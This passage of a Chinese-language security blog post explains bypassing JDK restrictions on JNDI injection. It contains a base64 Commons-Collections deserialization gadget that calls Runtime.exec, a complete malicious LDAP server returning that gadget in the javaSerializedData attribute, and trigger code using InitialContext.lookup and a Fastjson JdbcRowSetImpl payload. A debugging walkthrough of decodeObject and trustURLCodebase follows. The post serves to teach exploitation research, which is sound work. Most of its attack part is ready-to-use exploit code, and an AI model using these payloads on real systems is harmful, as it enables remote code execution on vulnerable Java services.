IAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=
```

恶意LDAP服务器如下，主要是在javaSerializedData字段内填入刚刚生成的反序列化payload数据：

```
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;

public class LdapServer {
    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#EvilObject";
        int port = 1234;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */

        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }

            // Payload1: 利用LDAP+Reference Factory
//            e.addAttribute("javaCodeBase", cbstring);
//            e.addAttribute("objectClass", "javaNamingReference");
//            e.addAttribute("javaFactory", this.codebase.getRef());

            // Payload2: 返回序列化Gadget
            try {
                e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="));
            } catch (ParseException exception) {
                exception.printStackTrace();
            }

            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

目标服务端代码，假设存在JNDI lookup()函数注入或Fastjson反序列化漏洞，此时通过JNDI注入实现反序列化漏洞利用：

```
import com.alibaba.fastjson.JSON;
import javax.naming.InitialContext;

public class Test {
    public static void main(String[] args) throws Exception {
        // lookup参数注入触发
//        new InitialContext().lookup("ldap://127.0.0.1:1234/EvilObject");

        // Fastjson反序列化JNDI注入Gadget触发
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/EvilObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}
```

运行成功绕过触发：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/3.png)

#### 调试分析

从lookup这个触发点来调试（前面Fastjson到最后利用的还是JNDI这个注入点）。

直接在com.sun.jndi.ldap.Obj类的decodeObject()函数上打上断点，此时函数调用栈如下：

```
decodeObject:235, Obj (com.sun.jndi.ldap)
c_lookup:1051, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:7, Test
```

前面的函数调用链都是不同类lookup()函数之间的调用，com.sun.jndi.ldap.LdapCtx类的c_lookup()函数中会调用到com.sun.jndi.ldap.Obj类的decodeObject()函数进行解码对象的操作。

跟进去，先调用getCodebases()函数从JAVA_ATTRIBUTES中取出索引为4即javaCodeBase的内容，由于本次并没有设置这个属性因此返回null即下面Variables框中的var1(slot_2)变量；然后从JAVA_ATTRIBUTES中取出索引为1即javaSerializedData的内容，这个我们是在恶意LDAP服务端中设置了的、内容就是恶意的Commons-Collections这个Gadget的恶意利用序列化对象字节流，对应的是下面Variables框中的var2 (slot_1)变量；这里var1(slot_2)变量为null，传入getURLClassLoader()函数调用后返回的是AppClassLoader即应用类加载器；再往下就是调用deserializeObject()函数来反序列化javaSerializedData的对象字节码：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/4.png)

其中静态变量JAVA_ATTRIBUTES的内容如下：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/5.png)

跟进函数中，就是熟悉的老朋友readObject()了，原生的Java反序列化漏洞就能触发了：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/6.png)

我们回到decodeObject()函数调用的getURLClassLoader()函数中，这是之前使用LDAP+Reference的方式被高版本JDK限制无法利用的地方。跟进去看看：

![img](https://web.archive.org/web/20221208235051im_/http://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/7.png)

入参var1是javaCodeBase项设置的内容，由于未设置该项因此直接返回var2变量即AppClassLoader应用类加载器实例。这里看到，如果我们使用LDAP+Reference的方式进行利用的话，是需要设置javaCodeBase项的，此时var1就不为null、满足第一个判断条件，但是第二个条件`"true".equalsIgnoreCase(trustURLCodebase)`在高版本JDK中是默认不成立的，即trustURLCodebase值默认为false，因此之前的LDAP+Reference就不能利用了。

## 0x03 参考

[如何绕过高版本JDK的限制进行JNDI注入利用](https://web.archive.org/web/20221208235051/https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html)

[Exploiting JNDI Injections in Java](https://web.archive.org/web/20221208235051/https://www.veracode.com/blog/research/exploiting-jndi-injections-java)